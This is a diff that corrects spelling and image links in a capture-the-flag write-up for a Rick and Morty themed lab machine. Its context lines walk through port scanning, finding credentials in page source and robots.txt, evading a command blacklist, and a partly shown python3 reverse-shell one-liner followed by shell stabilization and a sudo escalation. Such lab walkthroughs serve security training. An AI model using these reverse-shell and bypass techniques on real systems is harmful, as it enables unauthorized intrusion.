@@ -5,7 +5,7 @@ A Rick and Morty CTF. Help turn Rick back into a human!
 
 # External
 
-Inital `nmap` scan:
+Initial `nmap` scan:
 ```
 $ nmap -sC -sV -oN inital 10.10.69.168
 
@@ -48,16 +48,15 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /robots.txt           (Status: 200) [Size: 17]
 ```
 
-From our inital scans the obvious first move is to enumerate the web page running on port `80` since we have nothing to go off of for `ssh` 
+From our initial scans the obvious first move is to enumerate the web page running on port `80` since we have nothing to go off of for `ssh` 
 
 # Web App
 
 ![mainpage](https://i.imgur.com/Xie6ulW.png)
 
-Looking at the main page, nothing realling stands out to us except some room *lore* but, checking out the source of the page by pressing `CTRL + u` we get something interesting.
+Looking at the main page, nothing really stands out to us except some room *lore* but, checking out the source of the page by pressing `CTRL + u` we get something interesting.
 
-1.png
-
+![1](https://user-images.githubusercontent.com/69171981/120057539-b4243b00-bff8-11eb-84cf-a829d692362d.png)
 
 In a pretty bold comment we see `rick` has taken a note of his username but no password in sight. Now we know we have a username *most likely* for that `/login.php` page...
 
@@ -67,7 +66,7 @@ I tried some quick SQLi payloads to see if we have an easy access but came up wi
 
 ![robots](https://i.imgur.com/iZhpgcx.png)
 
-Inside, we see a *phrase* concatinated into a single word since it was in `robots.txt` I thought this might be a hidden directory, tring to access that page we get a `404` meaning it does not exist. 
+Inside, we see a *phrase* concatenated into a single word since it was in `robots.txt` I thought this might be a hidden directory, trying to access that page we get a `404` meaning it does not exist. 
 
 After a few minutes of thinking, if `rick` hid his password inside of the web page, he might be hiding his password as well, going off of this thought, I tried using the word that we found in `robots.txt` as `rick`'s password...
 
@@ -103,7 +102,7 @@ wrong. It seems that the `cat` command is disabled, that's fine there are plenty
 
 Let's see how they are blocking us from using a certain command.
 
-3.png
+![3](https://user-images.githubusercontent.com/69171981/120057546-bbe3df80-bff8-11eb-8baf-8f862dcad13b.png)
 
 Using the `tac` command we can read the source code of the file and see a `javascript` method with an array inside with the blacklisted commands. 
 
@@ -121,7 +120,7 @@ Reading this file we see that it is hinting at us to look around the file system
 
 Instead of manually looking around, we can use the `find` command inside of the command panel to speed up the process.
 
-2.png
+![2](https://user-images.githubusercontent.com/69171981/120057551-c30aed80-bff8-11eb-8bcf-8ba950611d6f.png)
 
 using this command, `find / -name "*second*" 2>>/dev/null` we see a quite promising file by the name `second ingredients` in `rick`'s home directory, let's see if we can `tac` it out.
 
@@ -129,7 +128,7 @@ using this command, `find / -name "*second*" 2>>/dev/null` we see a quite promis
 
 We can! After looking around a bit more to see if we could somehow access the final flag I decided it was time to get a shell.
 
-Heading over to pentestmonkey's [Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) Knowing that we cannot use `cat` in our input, we are unable to use the netcat reverse shell, so let's see if we can use `python3` in the command panel. 
+Heading over to pentestmonkey's [Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) Knowing that we cannot use `cat` in our input, we are unable to use the `netcat` reverse shell, so let's see if we can use `python3` in the command panel. 
 
 ![python](https://i.imgur.com/VojqzxJ.png)
 
@@ -148,7 +147,7 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 
 # Internal
 
-Now that we have a shell on the box, I will stablize it by using a few commands..
+Now that we have a shell on the box, I will stabilize it by using a few commands..
 
 ```
 python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -157,11 +156,11 @@ stty raw -echo; fg
 export TERM=xterm
 ```
 
-These commands stablize our shell so we can use our arrow keys, the `clear` command, etc.
+These commands stabilize our shell so we can use our arrow keys, the `clear` command, etc.
 
 We see that we are running as a low-privileged user `www-data`, I will start off with some manual enumeration to see if we can escalate our privileges.
 
-I alwasys start off my manual emueration with `sudo -l` this command lists commands that we can use as `sudo`, or the `root` user.
+I always start off my manual enumeration with `sudo -l` this command lists commands that we can use as `sudo`, or the `root` user.
 
 ![sudol](https://i.imgur.com/gktO0Eu.png)
 
@@ -174,5 +173,3 @@ Just like that we are root, all we have to do is find the final flag.
 ![finalflag](https://i.imgur.com/VtzZbTT.png)
 
 Checking out the `/root` directory we see `3rd.txt` with the third and final flag inside. That is all of the flags, thank you for joining me :)
-
-
